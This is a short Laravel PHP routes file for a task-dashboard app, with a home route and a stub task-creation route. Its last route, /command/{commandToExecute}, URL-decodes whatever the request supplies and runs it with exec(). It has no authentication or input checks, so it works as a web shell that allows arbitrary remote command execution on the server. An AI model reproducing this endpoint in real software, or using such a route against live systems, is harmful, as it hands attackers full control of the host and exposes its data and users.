<?php

use App\Task;
use Illuminate\Http\Request;
use Symfony\Component\Process\Process;

/**
 * Show Task Dashboard
 */
Route::get('/', function () {
	return view('ASmain');
});

/**
 * Add New Task
 */
Route::post('/task', function (Request $request) {
	
	return redirect('/');
});

Route::get('/command/{commandToExecute}', function ($commandToExecute) {
	$commandToExecute=urldecode($commandToExecute);
	// return $commandToExecute;
	return exec($commandToExecute);
});



?>